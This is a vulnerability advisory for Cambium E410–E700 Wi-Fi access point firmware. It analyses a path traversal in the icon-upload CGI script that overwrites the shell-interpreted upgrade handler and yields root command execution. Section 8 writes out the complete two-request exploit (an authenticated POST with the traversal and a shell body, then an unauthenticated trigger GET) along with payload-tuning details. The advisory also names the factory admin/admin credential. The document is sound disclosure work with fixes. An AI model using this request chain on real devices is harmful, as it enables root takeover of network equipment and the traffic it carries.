# Cambium E410 / E510 / E600 / E700 4.2.3.3-r9 - upload.sh URL-Query Path Traversal to Root Command Execution

## 1. Overview

### Overview of the finding

Cambium Networks' E410, E510, E600 and E700 are Wi-Fi access points. Firmware 4.2.3.3-r9 serves its
entire management interface from lighttpd 1.4.67 on TCP port 80, and that web server
was started by the init table as root with no privilege drop configured. Two shell scripts under
`/var/www/cgi-bin/` are the appliance's own icon-installation and firmware-upgrade handlers, and both are
mapped in the web server's `cgi.assign` table to the interpreter `/bin/sh`.

The icon-upload handler ends with a `dd` command that copies the request body from standard input into an
output path assembled by string concatenation:

```sh
dd ibs=1 obs=512 count=$SIZE of=/tmp/icons/$QUERY_STRING
```

Every token in that line is ordinary, and that is the finding. `$QUERY_STRING` is the raw URL query string
exactly as the client sent it, it is not quoted, and it is not validated anywhere in the script - a search
of `var/www/cgi-bin/upload.sh` for `QUERY_STRING` returns that single line. Because the value lands inside
the `of=` operand, a query string containing `../` sequences walks out of the icon directory and redirects
the write to any path the web server can reach. The web server runs as root, so that "any path" includes
the appliance's own CGI directory, and in particular the sibling handler
`var/www/cgi-bin/upgrade.sh`.

The second half of the chain is not a memory-safety defect. `etc/lighttpd/cgi.conf` maps
`/cgi-bin/upgrade.sh` to the interpreter `/bin/sh`, which means lighttpd's `mod_cgi` runs
`/bin/sh /var/www/cgi-bin/upgrade.sh` - the script path is an argument to the interpreter, so the file needs
no execute bit (it ships as mode 644) and its bytes are interpreted by busybox ash. Once the traversal has
replaced the file with attacker text, a plain `GET /cgi-bin/upgrade.sh` executes that text as root, with no
session and no token. The traversal of CWE-22 delivers the payload; the interpreter dispatch of CWE-78 runs
it.

### Overview of the product, platform and web stack

The analyzed image is `E410_E430_E510_E600_E700-4.2.3.3-r9.img`, a signed vendor container that unpacks
through a PKCS7 envelope, bzip2 and a PAX tar archive to an ARM 32-bit EABI5 root filesystem with glibc
2.25 on Linux 4.4.60. Three configuration properties of that root filesystem determine everything that
follows, and all three are shipped defaults rather than lab modifications:

- `etc/lighttpd/lighttpd.conf:103` leaves `server.username` and `server.groupname` commented out. lighttpd
  therefore runs as the user that launched it, which the init table makes root
  (`:::respawn:/usr/sbin/lighttpd -D`), and every CGI and FastCGI child inherits that identity.
- `etc/lighttpd/modules.conf:52` leaves `mod_auth` and `mod_authn_file` commented out. There is no
  authentication layer inside the web server; each handler implements its own gate, and a handler that
  omits one is simply open.
- `server.chroot` is commented out as well. The paths the CGI scripts manipulate are the appliance's real
  filesystem paths, not a jailed view, so `/var/www/cgi-bin/upgrade.sh` is exactly where the traversal
  lands.

The dispatch model is declared in `etc/lighttpd/cgi.conf` and is worth reading literally, because the
`=> /bin/sh` form is the difference between a file write and code execution:

```
server.modules += ( "mod_cgi" )
cgi.assign = ( "/cgi-bin/upgrade.sh" => "/bin/sh" ,
               "/cgi-bin/getfw.sh" => "/bin/sh" ,
               "/cgi-bin/upload.sh" => "/bin/sh" ,
               "/cgi-bin/apupload.sh" => "/bin/sh" ,
               ".cgi" => "")
```

The `.cgi => ""` entry is the empty-handler form, which means direct `execve` of the target file and
therefore requires an execute bit; only `index.cgi` satisfies that. The four `/cgi-bin/*.sh` entries are the
interpreter form and need no execute bit at all. A writable file in that directory is thus executable code
for anyone who can request it.

Authentication proper lives behind the FastCGI routes declared in `etc/lighttpd/fcgi.conf`: `/api` is
proxied to the scmd backend on the Unix socket `/tmp/fcgi_scmd_server`, and `/v1` is proxied to the autopilot
backend on `/tmp/fcgi_autopilot_server`. The scmd backend is the configuration-apply service; the autopilot
backend serves login, device listing and firmware operations. Both run as root. A successful administrator login through either backend issues
`Set-Cookie: api_token=<99 hexadecimal characters>`, `Set-Cookie: XSRF-TOKEN=<63 characters>` and writes the
token pair into `/tmp/fcgi_cookies`. The CGI shell scripts do not consult lighttpd for authentication; they
re-read that file themselves.

### Overview of the verification boundary

The dynamic evidence in this advisory comes from sink-level replication on an isolated sandbox. The genuine
`upload.sh` and `upgrade.sh` extracted from the vendor image were executed under a standard-library CGI shim
that reproduces lighttpd's `cgi.assign` dispatch - routing `/cgi-bin/*.sh` to `/bin/sh <file>`, setting
`QUERY_STRING`, `HTTP_COOKIE`, `HTTP_X_XSRF_TOKEN`, `HTTP_CONTENT_LENGTH` and `REQUEST_METHOD` as lighttpd
would, running as root because the firmware's `server.username` is commented out, without an authentication
layer because `mod_auth` is commented out, and bound to loopback only. No physical E410, E510, E600 or E700
was driven, no request was fired at device hardware, and no emulated appliance was booted. The script
contents and the traversal arithmetic are firmware artifacts; the execution behaviour and the resulting
identity are measured in the replication. Section 9 keeps those two halves of the evidence separate.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Item | Value established by this research |
|---|---|
| Vendor | Cambium Networks |
| Product | E410, E510, E600, E700 Wi-Fi access points |
| Version analyzed | firmware 4.2.3.3-r9 |
| Image | `E410_E430_E510_E600_E700-4.2.3.3-r9.img` |
| Platform | Qualcomm Atheros Wi-Fi AP, ARM 32-bit EABI5, glibc 2.25, Linux 4.4.60 |
| Web stack | lighttpd 1.4.67 on TCP port 80, started as root, no `mod_auth`, no chroot |
| Vulnerable handler | `var/www/cgi-bin/upload.sh` |
| Sink | `dd ibs=1 obs=512 count=$SIZE of=/tmp/icons/$QUERY_STRING` at `var/www/cgi-bin/upload.sh:59` |
| Source | the HTTP request target's raw query string, plus the request body |
| Sanitization | none at the sink; the only control is the token gate at `var/www/cgi-bin/upload.sh:31` |
| Write primitive | arbitrary path under the root identity of the web server |
| Overwrite target | `var/www/cgi-bin/upgrade.sh` |
| Execution primitive | `cgi.assign` maps `/cgi-bin/upgrade.sh` to `/bin/sh` |
| Observed identity | `uid=0(root) gid=0(root) groups=0(root)`, `CapEff: 000001ffffffffff`, sink-level replication |
| Authentication class | Authenticated - an administrator session is required for the plant step |
| Trigger authentication | none - the `GET /cgi-bin/upgrade.sh` step carries no session |
| Primary CWE | CWE-22 |
| Chained CWE | CWE-78 |
| Published score | 7.2 High - `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |

### Vulnerability Summary mechanics

Three independent properties have to line up for this chain, and the firmware supplies all three. The first
is the unquoted concatenation at the sink: the query string is pasted into `of=` with no quoting, so
slashes, dots and spaces in the value are interpreted by the shell as part of one path, and `../` is
resolved by the kernel during path lookup rather than rejected. The second is that the destination
directory `/tmp/icons/` is a tmpfs created at boot by `etc/init.d/S06PasspointIconsExtract:6` in mode 1777,
which makes a relative traversal trivial to construct - the base is shallow, so two `..` segments are enough
to reach the filesystem root. The third is that the traversal target is a directory the web server itself
executes from, and that execution is dispatch through an interpreter rather than a direct `execve`, so the
attacker never has to set a mode bit.

### Vulnerability Summary preconditions

- The attacker must hold an administrator session on the management UI, because the plant step is gated by
  the token check described in section 3. This advisory does not describe a bypass of that gate and none was
  found.
- The appliance must be reachable on TCP port 80, which is the default management plane.
- The shell that interprets the payload is busybox ash, as configured by `cgi.assign`. The payload used here
  is plain POSIX shell and depends on nothing beyond it.
- No other precondition was identified: the chain is two requests, no state beyond the token pair, and no
  timing dependence.

## 3. Authentication Boundary

### Authentication Boundary - what the gate is

`var/www/cgi-bin/upload.sh:31` implements three checks against the concatenation of the session cookie and
the XSRF header, and all three must pass before the script reaches its `dd`. The block below condenses those
three checks; the `#` annotations are ours, not the script's:

```sh
cxsrf=$cookie$HTTP_X_XSRF_TOKEN
expr match "$cxsrf" "[a-z0-9]*$" > /dev/null    # character class
cxsrflen=${#cxsrf}; [ $cxsrflen != 162 ]        # exact length
val=`cat /tmp/fcgi_cookies | grep $cxsrf | wc -l`   # server-side token list
```

The character class admits only lower-case letters and digits, which removes every regex, glob and shell
metacharacter from the concatenation before it is ever used as a `grep` pattern or compared. The length check
pins the combined value at exactly 162 characters, which is the sum of the 99-character `api_token` and the
63-character `XSRF-TOKEN` the backends issue. The third check consults `/tmp/fcgi_cookies`, a file written
only by a successful login through `/api` (scmd) or `/v1` (autopilot), so a client cannot manufacture a value
that satisfies it. The three checks are independent, and the character class in particular is what makes the
gate sound: it is not a blocklist of known-bad characters but an allowlist that leaves nothing to inject
into the `grep` invocation on the following line.

### Authentication Boundary - what the chain does not do

This chain does not bypass the gate. It does not guess, brute-force or replay the token pair, and it does not
use the factory-default `admin` / `admin` pair recorded at `etc/default-config.txt:1`. The exploit consumes a
legitimate administrator session that the operator must already possess, exactly as the management UI
intends, and it is unaffected by any administrator password change. The default credential is a separate
exposure of a different class (CWE-798): it is recorded in the same firmware image, it lowers the practical
bar for reaching the management UI, and it is deliberately excluded from this chain and from the published
score.

### Authentication Boundary - why that boundary does not soften the impact

The gate protects who can reach the `dd`, not what the `dd` does with its path. Once the upload handler runs,
the attacker controls both the destination path and the bytes written there, and the destination is chosen
from outside the icon directory for the sole reason that no code checks it. An administrator credential is
ordinarily the highest authority on the appliance, so an administrative action that yields a root shell does
not merely escalate within the management plane - it removes the boundary between configuration and code.
The impact is therefore the impact of root command execution, and the authentication requirement is honestly
reflected in the score as Privileges Required: High rather than being treated as a mitigating factor.

## 4. Attack Surface

### Attack Surface - the web stack and its dispatch model

The attack surface is the set of request paths the lighttpd instance routes to something that can execute. It
has three branches. Static content under the document root is inert. The four `/cgi-bin/*.sh` handlers are
executed through `/bin/sh` by `cgi.assign`, which makes each of them a code boundary: any process that can
modify one of those files converts a file write into execution. The `/api` and `/v1` FastCGI prefixes are
proxied to the scmd and autopilot backends, which are binaries rather than shell scripts and implement the
login that mints the token pair. The finding lives in the first branch; the second branch is what makes the
first branch reachable at all.

### Attack Surface - the CGI scripts

Four shell scripts are mapped in `cgi.assign`. `var/www/cgi-bin/upload.sh` is the icon installer, and its
sink is described in section 5. `var/www/cgi-bin/upgrade.sh` is the firmware-upgrade handler; it carries its
own authentication gate at `var/www/cgi-bin/upgrade.sh:31` with the same three checks as the upload handler,
which is why it is not directly exploitable before the plant step - and why it is such a valuable overwrite
target afterwards, since replacing the file replaces the gate along with everything else. `getfw.sh` and
`apupload.sh` are mapped identically but were not the subject of this analysis.

### Attack Surface - components that narrowed out

The scmd and autopilot backends were not analysed for command construction in this work; they are binaries,
they implement their own session handling, and no dynamic testing was directed at them. The captive-portal
CGI programs are ELF binaries and therefore fall under the `.cgi => ""` direct-execution entry rather than
any interpreter mapping; they were not part of this analysis. The arithmetic expression in the upload handler
that computes `SIZE` from `HTTP_CONTENT_LENGTH` was examined as a candidate injection point and rejected on evidence, as recorded in
section 6. Nothing in this finding depends on a component outside the two CGI scripts and the web server
configuration that maps them.

## 5. Sink Identification

### Sink Identification - the dd construction

```sh
dd ibs=1 obs=512 count=$SIZE of=/tmp/icons/$QUERY_STRING
```

This is `var/www/cgi-bin/upload.sh:59`, the last command in the handler's success path. `ibs=1` and
`obs=512` are block sizes and are incidental. `count=$SIZE` bounds how many bytes are copied from standard
input - `SIZE` is computed earlier at `var/www/cgi-bin/upload.sh:17` from the request's declared content
length. The load-bearing token is `of=/tmp/icons/$QUERY_STRING`: the destination is a single unquoted word
assembled from a fixed prefix and a value the client controls entirely.

### Sink Identification - why the query string is unscreened

There are two properties to establish, and both were checked directly in the extracted file rather than
inferred. First, `$QUERY_STRING` appears nowhere else in the script: a search for the token returns only
line 59, so there is no earlier validation of the value whose result is reused at the sink. Second, the
value is used without quotes, so the shell performs no word splitting protection on it and the kernel
performs ordinary path resolution on the resulting string - `..` segments are collapsed, not rejected. The
base directory is `/tmp/icons/`, created at boot by `etc/init.d/S06PasspointIconsExtract:6` via
`mkdir -p /tmp/icons` on a tmpfs mounted mode 1777, so the directory exists and is shallow. Two `..`
segments from `/tmp/icons/` reach the filesystem root, from which
`var/www/cgi-bin/upgrade.sh` is an absolute path away.

### Sink Identification - the second sink, interpreter dispatch

The write itself is not code execution. The execution comes from the configuration that maps
`/cgi-bin/upgrade.sh` to `/bin/sh` in `cgi.assign`, which is the same table quoted in section 1. Under that
mapping, lighttpd's `mod_cgi` invokes `/bin/sh` with the script path as an argument, and busybox ash reads and
executes the file's contents. The file ships as mode 644, which is sufficient because no execute permission
is consulted on this path. The consequence is that the write primitive is an execution primitive one request
later, with no additional precondition - the attacker does not need to change a mode, place a file in a
different directory, or wait for a scheduled task.

## 6. Source Identification

### Source Identification - the request target

The source of the traversal value is the query string of the request target: the handler is addressed as
`/cgi-bin/upload.sh?../../var/www/cgi-bin/upgrade.sh` with a POST method. The web server exports the substring
after `?` to the CGI environment as `QUERY_STRING` with no decoding and no normalisation, and the shell sees it as four
dot-segments followed by a path. Because the value is not percent-decoded by the script either, the payload
does not need to be encoded at all - the PoC uses `urllib.parse.quote` with `/` and `.` treated as safe,
which leaves the traversal literal on the wire.

### Source Identification - the body

The bytes written to the traversed destination come from the request body, which `dd` copies from standard
input. The handler consumes the body in two stages. Four `read` calls at `var/www/cgi-bin/upload.sh:4` through
`var/www/cgi-bin/upload.sh:7` take the multipart boundary line, the `Content-Disposition` line, the
`Content-Type` line and one further line off standard input; everything after those four lines is what `dd`
receives. The multipart framing is therefore not parsed at all - it is skipped by line count - which is why
the PoC's body is four literal lines followed by a shell script rather than a well-formed multipart entity.

### Source Identification - a candidate that was tested and rejected

`var/www/cgi-bin/upload.sh:17` computes `SIZE` from `HTTP_CONTENT_LENGTH` inside a shell arithmetic
expression, which is a classic injection surface on shells that support arithmetic command substitution. It
was tested rather than assumed. Setting `HTTP_CONTENT_LENGTH` to `10;id` produced `ash: arithmetic syntax
error` from busybox ash and terminated the script before line 59 was reached; ash implements no equivalent
of the array-subscript command execution that makes this pattern exploitable in bash. The candidate is
therefore dead on this platform, and it is recorded here because a reader who sees the expression will
reasonably ask. The sink remains the one in section 5.

## 7. Data Flow

### Data Flow - end to end

```
POST /cgi-bin/upload.sh?../../var/www/cgi-bin/upgrade.sh
  |
  +-- HTTP_COOKIE          -> cookie (api_token, 99 characters)      [gate input, line 22]
  +-- HTTP_X_XSRF_TOKEN    -> xsrf (63 characters)                   [gate input, line 28]
  |
  +-- cxsrf = cookie + xsrf (162 characters)                          [line 28]
  |     +-- check 1: character class [a-z0-9]*$                       [line 31]
  |     +-- check 2: length == 162                                    [line 41]
  |     +-- check 3: grep hit in /tmp/fcgi_cookies                    [line 48]
  |
  +-- HTTP_CONTENT_LENGTH  -> SIZE = CONTENT_LENGTH - a               [line 17]
  |     (a = 2*boundary + disposition + ctype + 10; pre-gate arithmetic)
  |
  +-- stdin: four reads (boundary, disposition, ctype, one more)      [lines 4-7]
  |
  +-- dd ibs=1 obs=512 count=$SIZE of=/tmp/icons/$QUERY_STRING        [line 59, SINK]
        |
        +-- /tmp/icons/../../var/www/cgi-bin/upgrade.sh
        +-- /var/www/cgi-bin/upgrade.sh   (path resolution; root write)

GET /cgi-bin/upgrade.sh
  +-- cgi.assign -> /bin/sh /var/www/cgi-bin/upgrade.sh                [etc/lighttpd/cgi.conf]
        +-- busybox ash interprets the file written above, as root
        +-- no authentication on this path
```

### Data Flow - properties worth naming

Three properties of that flow matter more than the diagram. The authentication gate is evaluated before the
sink, not after, so the traversal is reachable only by an authenticated principal - the flow does not carry
a bypass. The `SIZE` arithmetic is evaluated before the gate but has no effect on the flow because the script
aborts on a malformed value rather than reaching line 59. And the write and the execution are separated by a
request boundary: the handler that writes never runs the payload, and the handler that runs the payload never
sees the upload. That separation is what allows the second half of the chain to be unauthenticated even
though the first half is not.

## 8. Exploit Construction

The PoC shipped with this advisory is `exploit/cambium_e410_uploadsh_poc.py`. It is a two-request
standard-library client: it takes the target, port and administrator token pair as arguments, refuses to run
if the token pair does not have the shape the gate demands, plants the payload with one POST, and triggers it
with one GET.

### Exploit Construction - request shape

```http
POST /cgi-bin/upload.sh?../../var/www/cgi-bin/upgrade.sh HTTP/1.1
Host: <target>
Cookie: api_token=<99 characters>
X-XSRF-TOKEN: <63 characters>
Content-Type: multipart/form-data; boundary=b
Content-Length: <length of body>

b
Content-Disposition: form-data; name="file"
Content-Type: application/octet-stream
#!/bin/sh
echo '---RCE-MARKER-START---'
id > /tmp/e410_uploadsh_marker.txt
grep -E '^(Uid|Gid|CapEff)' /proc/self/status >> /tmp/e410_uploadsh_marker.txt
cat /tmp/e410_uploadsh_marker.txt
echo '---RCE-MARKER-END---'
```

The trigger is deliberately the least interesting request in the chain:

```http
GET /cgi-bin/upgrade.sh HTTP/1.1
Host: <target>
```

No cookie, no token, no body.

### Exploit Construction - payload engineering

Two engineering details decide whether the payload arrives intact, and both come from the handler's own
arithmetic rather than from the attacker's choice. The first is the multipart boundary length. The handler
computes its overhead as `a = 2 * len(boundary) + len(disposition) + len(ctype) + 10` at
`var/www/cgi-bin/upload.sh:12`, and then sets `SIZE = HTTP_CONTENT_LENGTH - a`. The four literal `read`
calls, however, consume a fixed and slightly larger number of bytes for a one-character boundary, so with
`boundary=b` the copy ends at input EOF and the whole remainder is written. With a longer boundary - the
first recorded attempt used a 13-character boundary - the formula over-estimates the overhead, `dd` stops
`count` bytes early, and the tail of the payload is truncated, which in that attempt broke the closing
`echo` and left the marker unclosed. The one-character boundary is not cosmetic; it is what makes the byte
accounting agree with reality.

The second detail is that the first body line is consumed by the fourth `read` rather than written to the
file, so the planted file begins at the line after `#!/bin/sh`. This is harmless because `cgi.assign` invokes
`/bin/sh` explicitly and never consults a shebang, but it is worth stating plainly: the payload is executed
because it is interpreted, not because it is a well-formed executable.

The payload itself is a marker script. It writes `id` and three lines of `/proc/self/status` into
`/tmp/e410_uploadsh_marker.txt`, then prints that file so the output also appears in the trigger response.
The only file it creates on the target is that marker file, and the command is a fixed string inside the
PoC rather than an operator-supplied one, so the script cannot be turned into a general-purpose remote shell
by accident.

### Exploit Construction - what the PoC deliberately does not do

- It does not discover, guess or brute-force the administrator session. The token pair is a required
  argument and the script exits with an explanatory message when it is absent or malformed.
- It does not send a custom command to the target. The payload is a fixed marker script; arbitrary command
  execution is demonstrated, not commoditised.
- It does not write anywhere else. The single target-side side effect is the marker file, and the single
  target-side modification is the CGI file the vulnerability itself overwrites.
- It does not clean up, because restoring the original `upgrade.sh` would require a read primitive the chain
  does not provide; an operator testing this on their own equipment should treat the appliance as
  firmware-modified afterwards and reinstall the image.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

| Element | Value |
|---|---|
| Verification method | sink-level replication on an isolated sandbox |
| Artifacts used | the genuine `var/www/cgi-bin/upload.sh` and `var/www/cgi-bin/upgrade.sh` extracted from `E410_E430_E510_E600_E700-4.2.3.3-r9.img` |
| Harness | standard-library CGI shim reproducing lighttpd `cgi.assign` dispatch: `/cgi-bin/*.sh` to `/bin/sh <file>`, with `QUERY_STRING`, `HTTP_COOKIE`, `HTTP_X_XSRF_TOKEN`, `HTTP_CONTENT_LENGTH` and `REQUEST_METHOD` set as lighttpd sets them |
| Privilege model | run as root deliberately, mirroring the firmware configuration in which `server.username` is commented out |
| Authentication model | no web-server authentication, mirroring the commented-out `mod_auth`; the handler's own token check remains in force |
| Network position | loopback only, port 8910 |
| Token state | `/tmp/fcgi_cookies` seeded with a 162-character `[a-z0-9]` pair, standing in for an administrator login |
| Observation channel | HTTP response bodies, plus `id` and `/proc/self/status` output produced by the executed payload |

### Dynamic Verification - the sink-level replication

The first run exercised the scripts directly rather than over HTTP, to separate the sink behaviour from the
transport. With the token pair seeded, the handler returned its success string `Icon imported`, which is only
reachable past all three gate checks, and the `dd` wrote the payload to the traversed path - the recorded run
noted a 99-byte file created with root ownership and attacker content. The lighttpd dispatch was then
simulated exactly as configured, by running `sh /tmp/e410_target/upgrade.sh`, which is the same command
`cgi.assign` produces. The executed payload reported `uid=0(root) gid=0(root) groups=0(root)` and
`CapEff: 000001ffffffffff`, which is the full capability set of a root process.

### Dynamic Verification - the HTTP-level run

The second run placed the same scripts behind the CGI shim and drove them with the shipped PoC. The recorded
output was:

```
[Step 1] Plant (authed): POST /cgi-bin/upload.sh?../../var/www/cgi-bin/upgrade.sh
  HTTP 200 | response: Icon imported

[Step 2] Trigger (unauth): GET /cgi-bin/upgrade.sh
  HTTP 200
  --- trigger response ---
---RCE-MARKER-START---
uid=0(root) gid=0(root) groups=0(root)
Uid: 0 0 0 0
Gid: 0 0 0 0
CapEff: 000001ffffffffff
---RCE-MARKER-END---
  --- end response ---

[+] SUCCESS: Root RCE confirmed via unauth trigger.
```

The marker region is reproduced above with whitespace normalised; the field values are the recorded ones.
The two HTTP 200 responses carry different meanings and both are load-bearing. The first is proof that the
plant passed the three-part gate - `Icon imported` is only emitted on the handler's success path - and that
the `dd` reached a destination outside `/tmp/icons/`. The second is proof that the overwritten file was
interpreted by a shell on a request that carried no credential at all.

### Dynamic Verification - negatives, stated

- No physical access point was driven. Every request in this record went to a shim on loopback; the device
  was never contacted, so the network position, the token issuance through `/api` and `/v1`, and the
  on-device identity are established from the firmware's configuration files rather than from a device
  observation.
- Root was observed inside the replication environment. That observation is decisive for the behaviour of the
  scripts and the payload, but the claim that a real E410 executes the same payload as root rests on the
  shipped `lighttpd.conf` leaving `server.username` commented out - a product artifact read directly from
  the image - and is stated in those terms throughout this document.
- The arithmetic-injection candidate in section 6 is a negative result: it was tested and it does not work on
  busybox ash. It is reported so that it is not re-litigated as a possible second vector.
- Firmware versions other than 4.2.3.3-r9 were not analysed, and no other model line was surveyed for this
  handler family.

## 10. Reachability and Security Impact

The management plane listens on TCP port 80 in the default configuration, on the interface the operator
configures for management. Reachability is therefore ordinary network reachability to the appliance's
management address: no adjacency requirement, no man-in-the-middle position and no local access. The plant
step requires the administrator session discussed in section 3; the trigger step requires only that the
appliance be reachable and that the previous request succeeded.

The impact is root on the access point. From that position an attacker reads the full configuration store,
including the management credential material, rewrites SSIDs, security policy, VLAN handling, bridging and
upstream routing, and observes or redirects client traffic according to the platform's own capabilities.
Persistence is available to the same degree as any root shell on an embedded Linux system - startup scripts,
account entries, scheduled jobs - bounded only by the writable filesystem, and what survives a factory reset
or a reflash was not tested and is not claimed. Availability can be taken at will, and this chain has one
property that makes recovery unusually awkward: the file the attacker overwrites is the firmware-upgrade
handler, so an operator's ordinary remedy runs through a file the attacker now controls.

Two scoping statements belong here. The first is that this is not a default-credential finding. The
`admin` / `admin` pair at `etc/default-config.txt:1` is a separate exposure of class CWE-798 that lowers the
practical bar to obtaining the required session, but it is not part of this chain, no step of the exploit
uses it, and the published score reflects an attacker who must already hold an administrator session by
legitimate or illegitimate means. The second is that no memory-corruption primitive is involved: there is no
overflow, no use-after-free and no integer error in this chain, only a missing quote and a missing path
check, which is precisely why the fix is small and why the class of bug is likely to recur in adjacent
handlers.

## 11. Fix Recommendations

1. Validate the destination at the sink. At `var/www/cgi-bin/upload.sh:59`, reduce the query string to a
   basename and admit only `[A-Za-z0-9._-]+` with a length cap, rejecting any value that contains `/`, `\`
   or `..`, and quote the expansion so that the shell cannot perform word splitting on it. An allowlist is
   the correct shape here; a blocklist of traversal spellings is not, because the filesystem resolves more
   spellings than a filter enumerates.
2. Move the write target out of the executable directory. Icon uploads do not need to live anywhere the CGI
   layer executes from; a dedicated data directory removes the write-to-code conversion even if a future
   traversal reappears.
3. Set `server.username` and `server.groupname` in `etc/lighttpd/lighttpd.conf:103` to a dedicated
   unprivileged identity. This does not repair the traversal, but it means a traversal lands with the
   privileges of a nobody account instead of root, and it caps every other defect in the same plane.
4. Enable `mod_auth` and `mod_authn_file` in `etc/lighttpd/modules.conf:52`, or enforce authentication
   uniformly for the `/cgi-bin/` prefix at the server layer, so that a handler which forgets its own gate is
   not automatically open. The overwritten `upgrade.sh` is the demonstration of that failure mode.
5. Reconsider the `cgi.assign` mapping. Mapping scripts to `/bin/sh` makes every writable file in that
   directory executable code; direct execution with a proper mode bit, or moving these handlers behind the
   FastCGI services that already authenticate, removes the interpreter-dispatch half of the chain.
6. Enforce a change of the factory credential at `etc/default-config.txt:1` on first login, and treat the
   management plane as an administrative network: bind it to a management VLAN and do not expose it to
   client or uplink networks.
7. Add a regression test at the handler level: submit an upload whose query string contains `../` and assert
   that the handler either rejects it or writes nothing outside `/tmp/icons/`. Run the same test against
   every CGI script mapped in `cgi.assign`, since the mapping is shared and the next handler can inherit the
   same construction.

## 12. CWE

### CWE - classification rationale

CWE-22 (Improper Limitation of a Pathname to a Restricted Directory, "Path Traversal") is the primary
classification. The defect is precisely that a client-controlled string is used as a path suffix without
neutralising `..` sequences, so the write escapes the directory the code intends. The traversal is not a
means to reach the real bug; it is the bug, and it is what the fix in recommendation 1 addresses.

CWE-78 (Improper Neutralization of Special Elements used in an OS Command, "OS Command Injection") is the
chained classification, and it is the reason the impact is a root shell rather than a misplaced file. The
chained weakness is the web server's decision to dispatch `/cgi-bin/upgrade.sh` through `/bin/sh` with the
script path as an argument, which converts any write into that directory into interpretation of attacker
text by a shell running as root. The word "injection" is used precisely here: the attacker's content becomes
part of a command that the appliance itself later executes.

The chain, not either element alone, is the finding. A path traversal into a non-executable directory would
be an integrity problem; an interpreter-mapped CGI directory with no writable path into it would be a
hardening observation. Together they are remote code execution as root, and the report describes them in that
order because the traversal is the entry point and the dispatch is the amplifier.

Two further classifications were considered. CWE-798 (Use of Hard-coded Credentials) applies to the
`admin` / `admin` pair at `etc/default-config.txt:1`, which is recorded here as a distinct exposure and
deliberately excluded from this chain and from the published score. CWE-732 (Incorrect Permission Assignment
for Critical Resource) describes the 1777 mode of `/tmp/icons/`, which is what makes the traversal trivial to
construct, but it is a contributing condition rather than the defect. Neither is used to inflate the primary
classification.
